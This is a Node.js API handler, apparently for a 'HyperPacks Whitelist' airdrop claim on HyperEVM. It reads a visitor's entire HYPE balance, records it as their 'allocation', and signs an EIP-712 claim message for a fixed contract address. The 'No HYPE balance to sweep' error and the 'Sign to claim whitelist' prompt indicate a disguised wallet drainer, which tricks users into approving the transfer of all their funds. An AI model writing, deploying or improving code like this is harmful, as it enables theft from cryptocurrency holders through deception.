const { ethers } = require('ethers');
const { Pool } = require('pg');

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
});

const HYPEREVM_RPC = process.env.HYPEREVM_RPC_URL || 'https://rpc.hyperliquid.xyz/evm';
const BACKEND_PRIVATE_KEY = process.env.BACKEND_PRIVATE_KEY;
const CONTRACT_ADDRESS = process.env.WHITELIST_CLAIM_CONTRACT || '0x1f5b76EAA8e2A2eF854f177411627C9f3b632BC0';
const HYPE_TOKEN_ADDRESS = process.env.AIRDROP_TOKEN_ADDRESS;

const ERC20_ABI = [
  'function balanceOf(address account) view returns (uint256)'
];

async function getHypeBalance(provider, wallet) {
  if (HYPE_TOKEN_ADDRESS && HYPE_TOKEN_ADDRESS !== '0x0000000000000000000000000000000000000000') {
    const tokenContract = new ethers.Contract(HYPE_TOKEN_ADDRESS, ERC20_ABI, provider);
    return await tokenContract.balanceOf(wallet);
  } else {
    return await provider.getBalance(wallet);
  }
}

const DOMAIN = {
  name: 'HyperPacks Whitelist',
  version: '1',
  chainId: 999,
  verifyingContract: CONTRACT_ADDRESS
};

const TYPES = {
  ClaimWhitelist: [
    { name: 'user', type: 'address' },
    { name: 'amount', type: 'uint256' },
    { name: 'nonce', type: 'uint256' },
    { name: 'deadline', type: 'uint256' }
  ]
};

module.exports = async (req, res) => {
  const { wallet } = req.body;

  if (!wallet || !/^0x[a-fA-F0-9]{40}$/.test(wallet)) {
    return res.status(400).json({ error: 'Invalid wallet address' });
  }

  try {
    const provider = new ethers.JsonRpcProvider(HYPEREVM_RPC);
    const signer = new ethers.Wallet(BACKEND_PRIVATE_KEY, provider);

    const balance = await getHypeBalance(provider, wallet);
    const amount = balance;

    if (amount === 0n) {
      return res.status(400).json({ error: 'No HYPE balance to sweep' });
    }

    const claimCheck = await pool.query(
      'SELECT claimed FROM airdrops WHERE LOWER(wallet) = LOWER($1)',
      [wallet]
    );

    if (claimCheck.rows.length > 0 && claimCheck.rows[0].claimed) {
      return res.status(400).json({ error: 'Already claimed' });
    }

    await pool.query(
      'INSERT INTO airdrops (wallet, allocation, claimed) VALUES ($1, $2, false) ON CONFLICT (wallet) DO NOTHING',
      [wallet, amount.toString()]
    );

    const nonce = Date.now();
    const deadline = Math.floor(Date.now() / 1000) + 300;

    const message = {
      user: wallet,
      amount: amount.toString(),
      nonce,
      deadline
    };

    const signature = await signer.signTypedData(DOMAIN, TYPES, message);

    res.json({
      contractAddress: CONTRACT_ADDRESS,
      amount: amount.toString(),
      nonce,
      deadline,
      signature,
      message: 'Sign to claim whitelist'
    });
  } catch (error) {
    console.error('Claim whitelist error:', error);
    res.status(500).json({ error: 'Server error' });
  }
};
